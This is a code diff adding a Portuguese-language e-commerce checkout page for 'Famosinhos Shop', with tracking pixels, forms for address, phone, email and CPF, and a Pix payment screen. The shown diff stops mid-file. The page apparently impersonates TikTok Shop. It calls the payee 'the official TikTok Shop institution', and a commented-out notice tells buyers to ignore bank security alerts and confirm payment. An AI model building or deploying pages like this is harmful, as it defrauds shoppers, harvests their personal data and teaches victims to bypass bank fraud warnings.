@@ -1,0 +1,1538 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<!-- TikTok Pixel Code Start -->
+<script>
+!function (w, d, t) {
+  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
+var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
+;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
+  ttq.load('D96D3DJC77UE6HCFJDJ0');
+  ttq.page();
+}(window, document, 'ttq');
+</script>
+<!-- TikTok Pixel Code End -->
+<!-- Spotify Pixel Code Start -->
+<script>
+  (function(w, d){
+    var id='spdt-capture', n='script';
+    if (!d.getElementById(id)) {
+      w.spdt = w.spdt || function() { (w.spdt.q = w.spdt.q || []).push(arguments); };
+      var e = d.createElement(n); e.id = id; e.async=1;
+      e.src = 'https://pixel.byspotify.com/ping.min.js';
+      var s = d.getElementsByTagName(n)[0]; s.parentNode.insertBefore(e, s);
+    }
+    w.spdt('conf', { key: 'b2d850e2d437439d8f7ed7f0a10968f0' });
+    w.spdt('view');
+  })(window, document);
+</script>
+<!-- Spotify Pixel Code End -->
+  <!-- Definição da função Purchase do TikTok para esta página -->
+  <script>
+    window.TIKTOK_ID_PIX = 'D96D3DJC77UE6HCFJDJ0';
+    window.dispararTikTokPurchase = function(valor) {
+      try {
+        if (window.ttq) {
+          window.ttq.track('Purchase', {
+            value: parseFloat(valor) || 0,
+            currency: 'BRL'
+          });
+          console.log('[TikTok Pixel] Purchase disparado no checkout. Valor:', valor);
+        } else {
+          console.warn('[TikTok Pixel] ttq não inicializado ainda.');
+        }
+      } catch(e) {
+        console.error('[TikTok Pixel] Erro ao disparar Purchase:', e);
+      }
+    };
+
+    window.dispararSpotifyPurchase = function(valor) {
+      try {
+        if (window.spdt) {
+          window.spdt('purchase', {
+            value: parseFloat(valor) || 0,
+            currency: 'BRL'
+          });
+          console.log('[Spotify Pixel] Purchase disparado no checkout. Valor:', valor);
+        } else {
+          console.warn('[Spotify Pixel] spdt não inicializado ainda.');
+        }
+      } catch(e) {
+        console.error('[Spotify Pixel] Erro ao disparar Purchase:', e);
+      }
+    };
+  </script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
+  <title>Resumo do Pedido - Famosinhos Shop</title>
+  <link rel="stylesheet" href="../css/style.css">
+  <style>
+    /* ===== CHECKOUT FIEL AO ORIGINAL ===== */
+    .co-header {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 14px 16px;
+      background: #fff;
+      border-bottom: 1px solid #f0f0f0;
+      position: fixed;
+      top: 0;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 100%;
+      max-width: 480px;
+      z-index: 100;
+    }
+    .co-header-back {
+      width: 32px;
+      height: 32px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: none;
+      border: none;
+      cursor: pointer;
+      color: #222;
+    }
+    .co-header-title {
+      font-size: 16px;
+      font-weight: 700;
+      color: #222;
+      flex: 1;
+    }
+
+    /* Seção de endereço / CPF */
+    .co-section {
+      background: #fff;
+      margin-bottom: 8px;
+    }
+    .co-btn-add {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      width: 100%;
+      padding: 16px;
+      background: none;
+      border: none;
+      border-bottom: 1px solid #f0f0f0;
+      cursor: pointer;
+      text-align: left;
+      font-size: 14px;
+      font-weight: 600;
+      color: #222;
+      transition: background .15s;
+    }
+    .co-btn-add:hover { background: #f9f9f9; }
+    .co-btn-add-plus {
+      width: 28px;
+      height: 28px;
+      background: #f5f5f5;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 18px;
+      color: #444;
+      flex-shrink: 0;
+    }
+    .co-addr-saved {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      padding: 14px 16px;
+      cursor: pointer;
+    }
+    .co-addr-saved-icon {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      background: #fff0f3;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #FF2B56;
+      flex-shrink: 0;
+    }
+    .co-addr-saved-info { flex: 1; }
+    .co-addr-saved-name { font-size: 13px; font-weight: 700; color: #222; }
+    .co-addr-saved-detail { font-size: 12px; color: #666; margin-top: 2px; line-height: 1.4; }
+    .co-addr-arrow { color: #bbb; margin-top: 2px; }
+
+    /* Divider pontilhado igual ao original */
+    .co-divider-dashed {
+      height: 4px;
+      background: repeating-linear-gradient(90deg, #FF2B56 0, #FF2B56 12px, transparent 12px, transparent 18px, #00b4d8 18px, #00b4d8 30px, transparent 30px, transparent 36px);
+      margin: 0;
+    }
+
+    /* Loja / produto */
+    .co-store-section {
+      background: #fff;
+      padding: 12px 16px 0;
+      margin-bottom: 8px;
+    }
+    .co-store-title {
+      font-size: 13px;
+      font-weight: 700;
+      color: #222;
+      margin-bottom: 8px;
+    }
+    .co-frete-gratis {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      background: #e8f5f9;
+      border-radius: 6px;
+      padding: 8px 12px;
+      font-size: 12px;
+      color: #0077b6;
+      font-weight: 600;
+      margin-bottom: 12px;
+    }
+    .co-product-row {
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      padding: 12px 0;
+      border-top: 1px solid #f0f0f0;
+    }
+    .co-product-img {
+      width: 72px;
+      height: 72px;
+      object-fit: contain;
+      background: #f9f9f9;
+      border-radius: 6px;
+      border: 1px solid #eee;
+      flex-shrink: 0;
+    }
+    .co-product-info { flex: 1; min-width: 0; }
+    .co-product-name {
+      font-size: 13px;
+      color: #222;
+      line-height: 1.4;
+      margin-bottom: 4px;
+      display: -webkit-box;
+      -webkit-line-clamp: 2;
+      -webkit-box-orient: vertical;
+      overflow: hidden;
+    }
+    .co-product-price {
+      font-size: 15px;
+      font-weight: 700;
+      color: #FF2B56;
+    }
+    .co-product-price-old {
+      font-size: 12px;
+      color: #999;
+      text-decoration: line-through;
+      margin-left: 4px;
+    }
+    .co-product-discount-badge {
+      background: #FF2B56;
+      color: #fff;
+      font-size: 10px;
+      font-weight: 700;
+      padding: 1px 5px;
+      border-radius: 3px;
+      margin-left: 4px;
+    }
+    .co-qty-controls {
+      display: flex;
+      align-items: center;
+      gap: 0;
+      border: 1px solid #e0e0e0;
+      border-radius: 6px;
+      overflow: hidden;
+      width: fit-content;
+      margin-top: 6px;
+    }
+    .co-qty-btn {
+      width: 28px;
+      height: 26px;
+      background: #f5f5f5;
+      border: none;
+      font-size: 16px;
+      cursor: pointer;
+      color: #444;
+    }
+    .co-qty-val {
+      width: 28px;
+      text-align: center;
+      font-size: 13px;
+      font-weight: 600;
+    }
+
+    /* Frete */
+    .co-frete-section {
+      padding: 12px 16px;
+      border-top: 1px solid #f0f0f0;
+    }
+    .co-frete-title { font-size: 13px; font-weight: 700; margin-bottom: 10px; color: #222; }
+    .co-frete-option {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 10px 0;
+      cursor: pointer;
+    }
+    .co-radio {
+      width: 18px;
+      height: 18px;
+      border-radius: 50%;
+      border: 2px solid #ccc;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+    }
+    .co-radio.selected { border-color: #FF2B56; }
+    .co-radio-dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: #FF2B56;
+      display: none;
+    }
+    .co-radio.selected .co-radio-dot { display: block; }
+    .co-frete-info { flex: 1; }
+    .co-frete-name { font-size: 13px; font-weight: 600; color: #222; }
+    .co-frete-desc { font-size: 12px; color: #999; margin-top: 1px; }
+    .co-frete-price { font-size: 13px; font-weight: 700; color: #0d9488; }
+    .co-economia {
+      font-size: 12px;
+      color: #2E7D32;
+      margin-top: 6px;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+
+    /* Total */
+    .co-total-section {
+      padding: 14px 16px;
+      background: #fff;
+      border-top: 1px solid #f0f0f0;
+    }
+    .co-total-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .co-total-label { font-size: 15px; font-weight: 700; color: #222; }
+    .co-total-items { font-size: 12px; color: #999; margin-top: 1px; }
+    .co-total-value { font-size: 17px; font-weight: 800; color: #FF2B56; }
+
+    /* Fazer Pedido btn */
+    .co-fazer-pedido {
+      position: fixed;
+      bottom: 0;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 100%;
+      max-width: 480px;
+      background: #fff;
+      border-top: 1px solid #f0f0f0;
+      padding: 10px 16px;
+      z-index: 100;
+    }
+    .co-btn-fazer {
+      width: 100%;
+      height: 50px;
+      background: #FF2B56;
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: opacity .15s;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 0;
+    }
+    .co-btn-fazer:hover { opacity: .9; }
+    .co-btn-fazer-sub {
+      font-size: 11px;
+      font-weight: 400;
+      opacity: .85;
+    }
+
+    /* ===== TELA ADICIONAR ENDEREÇO ===== */
+    .addr-screen {
+      position: fixed;
+      inset: 0;
+      background: #f5f5f5;
+      z-index: 200;
+      display: none;
+      flex-direction: column;
+      width: 100%;
+      max-width: 480px;
+      left: 50%;
+      transform: translateX(-50%);
+    }
+    .addr-screen.open { display: flex; }
+    .addr-screen-header {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 14px 16px;
+      background: #fff;
+      border-bottom: 1px solid #f0f0f0;
+    }
+    .addr-screen-title { font-size: 16px; font-weight: 700; color: #222; flex: 1; }
+    .addr-screen-body {
+      flex: 1;
+      overflow-y: auto;
+      padding: 16px;
+    }
+    .addr-section-label {
+      font-size: 14px;
+      font-weight: 700;
+      color: #222;
+      margin-bottom: 14px;
+      padding: 0 2px;
+    }
+    .addr-card {
+      background: #fff;
+      border-radius: 10px;
+      overflow: hidden;
+      box-shadow: 0 1px 3px rgba(0,0,0,.08);
+    }
+    .addr-input {
+      width: 100%;
+      padding: 14px 16px;
+      border: none;
+      border-bottom: 1px solid #f0f0f0;
+      font-size: 14px;
+      color: #222;
+      background: #fff;
+      outline: none;
+      font-family: inherit;
+    }
+    .addr-input:last-child { border-bottom: none; }
+    .addr-input::placeholder { color: #bbb; }
+    .addr-input.with-prefix {
+      display: flex;
+      align-items: center;
+    }
+    .addr-prefix {
+      font-size: 14px;
+      color: #777;
+      padding-left: 16px;
+      border-bottom: 1px solid #f0f0f0;
+      line-height: 48px;
+      background: #fff;
+      white-space: nowrap;
+    }
+    .addr-input-row {
+      display: flex;
+      align-items: center;
+      border-bottom: 1px solid #f0f0f0;
+    }
+    .addr-input-row .addr-input { border-bottom: none; }
+    .addr-screen-footer {
+      padding: 12px 16px;
+      background: #fff;
+      border-top: 1px solid #f0f0f0;
+    }
+    .addr-btn-continuar, .addr-btn-salvar {
+      width: 100%;
+      height: 50px;
+      background: #ccc;
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: background .2s;
+    }
+    .addr-btn-continuar.active, .addr-btn-salvar.active {
+      background: #FF2B56;
+    }
+
+    /* Tela 2 endereço CEP */
+    .addr2-screen {
+      position: fixed;
+      inset: 0;
+      background: #f5f5f5;
+      z-index: 300;
+      display: none;
+      flex-direction: column;
+      width: 100%;
+      max-width: 480px;
+      left: 50%;
+      transform: translateX(-50%);
+    }
+    .addr2-screen.open { display: flex; }
+
+    /* ===== MODAL CPF ===== */
+    .cpf-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,.5);
+      z-index: 400;
+      display: none;
+      align-items: flex-end;
+      justify-content: center;
+    }
+    .cpf-overlay.open {
+      display: flex;
+    }
+    .cpf-modal {
+      width: 100%;
+      max-width: 480px;
+      background: #fff;
+      border-radius: 16px 16px 0 0;
+      padding: 20px 20px 32px;
+      position: relative;
+    }
+    .cpf-modal-close {
+      position: absolute;
+      top: 16px;
+      right: 16px;
+      width: 28px;
+      height: 28px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: none;
+      border: none;
+      font-size: 18px;
+      cursor: pointer;
+      color: #666;
+    }
+    .cpf-modal-title {
+      font-size: 16px;
+      font-weight: 700;
+      color: #222;
+      margin-bottom: 6px;
+    }
+    .cpf-modal-sub {
+      font-size: 13px;
+      color: #888;
+      margin-bottom: 16px;
+    }
+    .cpf-input {
+      width: 100%;
+      height: 48px;
+      background: #f5f5f5;
+      border: none;
+      border-radius: 8px;
+      padding: 0 16px;
+      font-size: 15px;
+      color: #222;
+      outline: none;
+      margin-bottom: 14px;
+      font-family: inherit;
+    }
+    .cpf-btn {
+      width: 100%;
+      height: 50px;
+      background: #FF2B56;
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+    }
+
+    /* ===== TELA PIX ===== */
+    .pix-screen {
+      position: fixed;
+      inset: 0;
+      background: #f5f5f5;
+      z-index: 500;
+      display: none;
+      flex-direction: column;
+      width: 100%;
+      max-width: 480px;
+      left: 50%;
+      transform: translateX(-50%);
+    }
+    .pix-screen.open { display: flex; }
+    .pix-screen-header {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 14px 16px;
+      background: #fff;
+      border-bottom: 1px solid #f0f0f0;
+    }
+    .pix-screen-body {
+      flex: 1;
+      overflow-y: auto;
+      padding: 16px;
+    }
+    .pix-card {
+      background: #fff;
+      border-radius: 10px;
+      padding: 16px;
+      margin-bottom: 12px;
+    }
+    .pix-waiting-title {
+      font-size: 20px;
+      font-weight: 800;
+      color: #222;
+      margin-bottom: 4px;
+    }
+    .pix-amount {
+      font-size: 22px;
+      font-weight: 800;
+      color: #222;
+      margin-bottom: 6px;
+    }
+    .pix-timer-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+      background: #FF2B56;
+      color: #fff;
+      font-size: 12px;
+      font-weight: 700;
+      padding: 4px 10px;
+      border-radius: 6px;
+      margin-bottom: 6px;
+      font-family: monospace;
+    }
+    .pix-prazo {
+      font-size: 12px;
+      color: #999;
+    }
+    .pix-code-label {
+      font-size: 14px;
+      font-weight: 700;
+      color: #222;
+      margin-bottom: 10px;
+    }
+    .pix-code-box {
+      background: #f9f9f9;
+      border: 1px solid #e0e0e0;
+      border-radius: 8px;
+      padding: 12px;
+      font-size: 11px;
+      color: #555;
+      word-break: break-all;
+      font-family: monospace;
+      text-align: center;
+      margin-bottom: 12px;
+      line-height: 1.5;
+    }
+    .pix-copy-btn {
+      width: 100%;
+      height: 48px;
+      background: #FF2B56;
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      font-size: 14px;
+      font-weight: 700;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      transition: opacity .15s;
+    }
+    .pix-copy-btn:hover { opacity: .9; }
+    .pix-how-title {
+      font-size: 14px;
+      font-weight: 700;
+      color: #222;
+      margin-bottom: 12px;
+    }
+    .pix-step {
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      margin-bottom: 14px;
+    }
+    .pix-step-icon {
+      width: 36px;
+      height: 36px;
+      background: #f5f5f5;
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+    }
+    .pix-step-text {}
+    .pix-step-title { font-size: 13px; font-weight: 600; color: #222; }
+    .pix-step-sub { font-size: 12px; color: #999; margin-top: 1px; }
+    .pix-economia-bar {
+      position: fixed;
+      bottom: 0;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 100%;
+      max-width: 480px;
+      background: #fff8f0;
+      border-top: 1px solid #ffd7b0;
+      padding: 10px 16px;
+      z-index: 501;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 13px;
+      color: #e65c00;
+      font-weight: 500;
+    }
+  </style>
+</head>
+<body>
+<div class="app-container" style="background:#f5f5f5">
+
+  <!-- HEADER DO CHECKOUT -->
+  <div class="co-header">
+    <button class="co-header-back" onclick="history.back()">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="m15 18-6-6 6-6"/></svg>
+    </button>
+    <div class="co-header-title">Resumo do Pedido</div>
+  </div>
+
+  <!-- CONTEÚDO PRINCIPAL -->
+  <div class="page-content" id="checkout-main" style="padding-top:0px;padding-bottom:80px;background:#f5f5f5">
+
+    <!-- ENDEREÇO -->
+    <div class="co-section" style="margin-top:0px">
+      <div id="btn-add-addr" class="co-btn-add" onclick="openAddrScreen()">
+        <div class="co-btn-add-plus">+</div>
+        <span>Adicionar endereço de entrega</span>
+      </div>
+      <div id="addr-saved-view" style="display:none" onclick="openAddrScreen()">
+        <div class="co-addr-saved">
+          <div class="co-addr-saved-icon">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg>
+          </div>
+          <div class="co-addr-saved-info">
+            <div class="co-addr-saved-name" id="saved-name-display">—</div>
+            <div class="co-addr-saved-detail" id="saved-addr-display">—</div>
+          </div>
+          <div class="co-addr-arrow">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m9 18 6-6-6-6"/></svg>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- CPF -->
+    <div class="co-section">
+      <div id="btn-add-cpf" class="co-btn-add" onclick="openCpfModal()">
+        <div class="co-btn-add-plus">+</div>
+        <span>Adicionar CPF</span>
+      </div>
+      <div id="cpf-saved-view" style="display:none">
+        <div class="co-addr-saved" onclick="openCpfModal()">
+          <div class="co-addr-saved-icon">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="4" width="18" height="16" rx="2"/><line x1="7" y1="10" x2="17" y2="10"/><line x1="7" y1="14" x2="13" y2="14"/></svg>
+          </div>
+          <div class="co-addr-saved-info">
+            <div class="co-addr-saved-name">CPF adicionado</div>
+            <div class="co-addr-saved-detail" id="cpf-display">—</div>
+          </div>
+          <div class="co-addr-arrow">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m9 18 6-6-6-6"/></svg>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- DIVIDER PONTILHADO -->
+    <div class="co-divider-dashed"></div>
+
+    <!-- PRODUTOS -->
+    <div class="co-store-section" style="margin-top:8px">
+      <div class="co-store-title" id="store-items-count">Loja (0)</div>
+      <div class="co-frete-gratis">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#0077b6" stroke-width="2"><rect x="1" y="3" width="15" height="13"/><path d="M16 8h4l3 3v5h-7V8z"/><circle cx="5.5" cy="18.5" r="2.5"/><circle cx="18.5" cy="18.5" r="2.5"/></svg>
+        Você ganhou frete grátis!
+      </div>
+      <div id="co-products-list"></div>
+
+      <!-- FRETE -->
+      <div class="co-frete-section">
+        <div class="co-frete-title">Frete</div>
+        <div class="co-frete-option" onclick="selectFrete('gratis')">
+          <div class="co-radio selected" id="radio-gratis"><div class="co-radio-dot"></div></div>
+          <div class="co-frete-info">
+            <div class="co-frete-name">Frete Grátis</div>
+            <div class="co-frete-desc">Entrega de 7 a 5 dias úteis</div>
+          </div>
+          <div class="co-frete-price">Grátis</div>
+        </div>
+        <div class="co-frete-option" onclick="selectFrete('expresso')">
+          <div class="co-radio" id="radio-expresso"><div class="co-radio-dot"></div></div>
+          <div class="co-frete-info">
+            <div class="co-frete-name">Frete Expresso</div>
+            <div class="co-frete-desc">Entrega de 3 a 5 dias úteis</div>
+          </div>
+          <div class="co-frete-price" style="color:#666">R$ 7,98</div>
+        </div>
+        <div class="co-economia" id="economia-text">
+          😊 Você está economizando <span id="economia-valor">R$ 0,00</span> neste pedido.
+        </div>
+      </div>
+
+      <!-- TOTAL -->
+      <div class="co-total-section">
+        <div class="co-total-row">
+          <div>
+            <div class="co-total-label">Total (<span id="total-itens">0</span> itens)</div>
+          </div>
+          <div class="co-total-value" id="total-value">R$ 0,00</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- BOTÃO FAZER PEDIDO -->
+  <div class="co-fazer-pedido">
+    <button class="co-btn-fazer" onclick="fazerPedido()">
+      <span>Fazer Pedido</span>
+      <span class="co-btn-fazer-sub" id="cupom-timer">O cupom expira em 15:00</span>
+    </button>
+  </div>
+
+  <!-- =========================================
+       TELA 1: ADICIONAR ENDEREÇO - CONTATO
+  ========================================= -->
+  <div class="addr-screen" id="addr-screen-1">
+    <div class="addr-screen-header">
+      <button class="co-header-back" onclick="closeAddrScreen()">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="m15 18-6-6 6-6"/></svg>
+      </button>
+      <div class="addr-screen-title">Adicionar o novo endereço</div>
+    </div>
+    <div class="addr-screen-body">
+      <div class="addr-section-label">Informações de contato</div>
+      <div class="addr-card">
+        <input type="text" class="addr-input" id="addr-nome" placeholder="Nome" oninput="checkAddrForm1()">
+        <input type="text" class="addr-input" id="addr-sobrenome" placeholder="Sobrenome" oninput="checkAddrForm1()">
+        <div class="addr-input-row">
+          <span class="addr-prefix">BR +55</span>
+          <input type="tel" class="addr-input" id="addr-tel" placeholder="Número de telefone" oninput="checkAddrForm1(); formatAddrTel(this)" maxlength="12">
+        </div>
+        <input type="email" class="addr-input" id="addr-email" placeholder="E-mail" oninput="checkAddrForm1()">
+      </div>
+    </div>
+    <div class="addr-screen-footer">
+      <button class="addr-btn-continuar" id="btn-continuar-1" onclick="avancarAddr2()">Continuar</button>
+    </div>
+  </div>
+
+  <!-- =========================================
+       TELA 2: ENDEREÇO - CEP/DADOS
+  ========================================= -->
+  <div class="addr2-screen" id="addr-screen-2">
+    <div class="addr-screen-header">
+      <button class="co-header-back" onclick="voltarAddr1()">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="m15 18-6-6 6-6"/></svg>
+      </button>
+      <div class="addr-screen-title">Adicionar o novo endereço</div>
+    </div>
+    <div class="addr-screen-body">
+      <div class="addr-section-label">Informações de endereço</div>
+      <div class="addr-card" style="margin-bottom:12px">
+        <input type="text" class="addr-input" id="addr-cep" placeholder="CEP/Código postal" maxlength="9" oninput="formatCEPAddr(this); checkAddrForm2()" onblur="buscarCEPAddr(this.value)">
+      </div>
+      <div class="addr-card" id="addr-full-form">
+        <input type="text" class="addr-input" id="addr-estado" placeholder="Estado" oninput="checkAddrForm2()">
+        <input type="text" class="addr-input" id="addr-cidade" placeholder="Cidade" oninput="checkAddrForm2()">
+        <input type="text" class="addr-input" id="addr-bairro" placeholder="Bairro" oninput="checkAddrForm2()">
+        <input type="text" class="addr-input" id="addr-rua" placeholder="Logradouro" oninput="checkAddrForm2()">
+        <input type="text" class="addr-input" id="addr-num" placeholder="Número" oninput="checkAddrForm2()">
+        <input type="text" class="addr-input" id="addr-comp" placeholder="Complemento (opcional)">
+      </div>
+    </div>
+    <div class="addr-screen-footer">
+      <button class="addr-btn-salvar" id="btn-salvar-addr" onclick="salvarEndereco()">Salvar endereço</button>
+    </div>
+  </div>
+
+  <!-- =========================================
+       MODAL CPF
+  ========================================= -->
+  <div class="cpf-overlay" id="cpf-overlay" onclick="closeCpfModal(event)">
+    <div class="cpf-modal">
+      <button class="cpf-modal-close" onclick="closeCpfModalBtn()">×</button>
+      <div class="cpf-modal-title">Adicionar CPF</div>
+      <div class="cpf-modal-sub">O CPF é obrigatório para a emissão de faturas e processamento do pedido</div>
+      <input type="text" class="cpf-input" id="cpf-input" placeholder="000.000.000-00" maxlength="14" oninput="formatCPF(this)">
+      <button class="cpf-btn" onclick="confirmarCPF()">Confirmar</button>
+    </div>
+  </div>
+
+  <!-- =========================================
+       TELA PIX
+  ========================================= -->
+  <div class="pix-screen" id="pix-screen">
+    <div class="pix-screen-header">
+      <button class="co-header-back" onclick="closePix()">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="m15 18-6-6 6-6"/></svg>
+      </button>
+      <div class="addr-screen-title">Código do pagamento</div>
+    </div>
+    <div class="pix-screen-body" style="padding-bottom:70px">
+
+      <!-- Card aguardando -->
+      <div class="pix-card">
+        <div class="pix-waiting-title">Aguardando o pagamento</div>
+        <div class="pix-amount" id="pix-amount">R$ 0,00</div>
+        <div class="pix-timer-badge">
+          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+          <span id="pix-countdown">00:30:00</span>
+        </div>
+        <div class="pix-prazo" id="pix-prazo"></div>
+      </div>
+
+      <!-- PIX code -->
+      <div class="pix-card">
+        <div class="pix-code-label">Pagamento via Pix</div>
+        <div class="pix-code-box" id="pix-code-text">00020126580014br.gov.bcb.pix0136a629532e-7693-4846-b028-4c3de5d97c4f5204000053039865405XX.XX5802BR5925FAMOSINHOS SHOP6009SAO PAULO62070503***63041234</div>
+        <button class="pix-copy-btn" onclick="copyPixCode()">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+          Copiar
+        </button>
+      </div>
+
+      <!-- Como pagar -->
+      <div class="pix-card">
+        <div class="pix-how-title">Como pagar com Pix (copia e cola)</div>
+        <div class="pix-step">
+          <div class="pix-step-icon">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#555" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+          </div>
+          <div class="pix-step-text">
+            <div class="pix-step-title">Copie o código</div>
+            <div class="pix-step-sub">Use o botão copiar para levar o código Pix.</div>
+          </div>
+        </div>
+        <div class="pix-step">
+          <div class="pix-step-icon">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#555" stroke-width="2"><rect x="5" y="2" width="14" height="20" rx="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>
+          </div>
+          <div class="pix-step-text">
+            <div class="pix-step-title">Abra o app do banco</div>
+            <div class="pix-step-sub">Entre no aplicativo financeiro onde deseja pagar.</div>
+          </div>
+        </div>
+        <div class="pix-step">
+          <div class="pix-step-icon">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#555" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+          </div>
+          <div class="pix-step-text">
+            <div class="pix-step-title">Pix &gt; Copia e cola</div>
+            <div class="pix-step-sub">Cole o código na opção Pix copia e cola.</div>
+          </div>
+        </div>
+        <div class="pix-step">
+          <div class="pix-step-icon">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#555" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>
+          </div>
+          <div class="pix-step-text">
+            <div class="pix-step-title">Confirme o pagamento</div>
+            <div class="pix-step-sub">Confirme o pagamento no banco. Pronto!</div>
+          </div>
+        </div>
+        <!-- alerta no codigo:
+        <div style="margin-top: 15px; font-size: 13px; line-height: 1.5; color: #555;">
+          <strong>Atenção:</strong> Alguns bancos estão exibindo um alerta de segurança devido a uma instabilidade temporária na rede Pix. Mas fique tranquilo: esse pagamento é totalmente confiável e oficial do TikTok Shop! Basta prosseguir e confirmar o pagamento normalmente para concluir o seu pedido.
+        </div>
+        -->
+        <div id="acquirer-verification" style="margin-top: 15px; display: none;">
+          <div>
+            <div style="font-size: 17px; font-weight: 800; color: #111; margin-bottom: 8px;">Você pagará para:</div>
+            <div style="display: flex; align-items: center; gap: 5px; font-size: 13px; font-weight: normal; color: #444;">
+              <span id="acquirer-name"></span>
+              <svg width="14" height="14" viewBox="0 0 24 24" style="flex-shrink: 0;"><path fill="#007bff" d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm-1.3 14.7L6.3 12.3l1.4-1.4 3 3 7.1-7.1 1.4 1.4-8.5 8.5z"/></svg>
+            </div>
+          </div>
+          <div style="margin-top: 4px; font-size: 13px; color: #444; line-height: 1.6;">
+            Essa é a instituição oficial do TikTok Shop. Só efetue o pagamento se ver esse nome na hora de pagar.
+          </div>
+        </div>
+      </div>
+    </div>
+
